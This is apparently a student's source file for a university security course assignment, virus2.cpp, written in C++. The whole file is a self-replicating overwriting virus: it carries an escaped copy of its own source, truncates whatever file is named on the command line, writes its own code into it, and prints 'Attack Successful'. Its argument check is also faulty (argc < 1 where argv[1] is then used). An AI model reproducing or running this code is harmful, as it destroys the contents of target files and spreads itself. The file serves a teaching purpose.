// COMP3632 Assignment 1 virus2.cpp
// Dhesant Nakka | 20146587

#include <iostream>
#include <fstream>
#include <cstring>

std::string code = "// COMP3632 Assignment 1 virus2.cpp\n\
// Dhesant Nakka | 20146587\n\
\n\
#include <iostream>\n\
#include <fstream>\n\
#include <cstring>\n\
\n\
std::string code = \"@@\";\n\
\n\
std::string escape_string(std::string in) {\n\
    std::string out;\n\
    \n\
    for (std::size_t i = 0; i < in.size(); ++i) {\n\
	if (in[i] == '\\\\')\n\
	    out += \"\\\\\\\\\";\n\
	else if (in[i] == '\\n')\n\
	    out += \"\\\\n\\\\\\n\";\n\
	else if (in[i] == '\\\"')\n\
	    out += \"\\\\\\\"\";\n\
	else\n\
	    out += in[i];\n\
    }\n\
    \n\
    return out;\n\
}\n\
\n\
int main (int argc, char** argv) {\n\
    // Ensure valid argument\n\
    if (argc < 1) {\n\
	std::cout << \"No target specified\" << std::endl;\n\
	return 1;\n\
    }\n\
    \n\
    std::cout << \"Opening: \" << argv[1] << std::endl;\n\
    \n\
    std::fstream fs;\n\
    fs.open(argv[1], std::fstream::out | std::fstream::trunc);\n\
    \n\
    if (!fs.is_open()) {\n\
	std::cout << \"File opening failed\" << std::endl;\n\
	return 1;\n\
    }\n\
    \n\
    std::size_t pos = code.find(\"@@\");\n\
    \n\
    std::string token = code.substr(0,pos);\n\
    \n\
    fs.write(token.c_str(), token.size());\n\
    \n\
    token = escape_string(code);\n\
    fs.write(token.c_str(), token.size());\n\
    \n\
    token = code.substr(pos+2);\n\
    fs.write(token.c_str(), token.size());\n\
    \n\
    fs.close();\n\
    std::cout << \"Attack Successful. Have a nice day!\" << std::endl;\n\
    \n\
    return 0;\n\
}";

std::string escape_string(std::string in) {
    std::string out;
    
    for (std::size_t i = 0; i < in.size(); ++i) {
	if (in[i] == '\\')
	    out += "\\\\";
	else if (in[i] == '\n')
	    out += "\\n\\\n";
	else if (in[i] == '\"')
	    out += "\\\"";
	else
	    out += in[i];
    }
    
    return out;
}

int main (int argc, char** argv) {
    // Ensure valid argument
    if (argc < 1) {
	std::cout << "No target specified" << std::endl;
	return 1;
    }
    
    std::cout << "Opening: " << argv[1] << std::endl;
    
    std::fstream fs;
    fs.open(argv[1], std::fstream::out | std::fstream::trunc);
    
    if (!fs.is_open()) {
	std::cout << "File opening failed" << std::endl;
	return 1;
    }
    
    std::size_t pos = code.find("@@");
    
    std::string token = code.substr(0,pos);
    
    fs.write(token.c_str(), token.size());
    
    token = escape_string(code);
    fs.write(token.c_str(), token.size());
    
    token = code.substr(pos+2);
    fs.write(token.c_str(), token.size());
    
    fs.close();
    std::cout << "Attack Successful. Have a nice day!" << std::endl;
    
    return 0;
}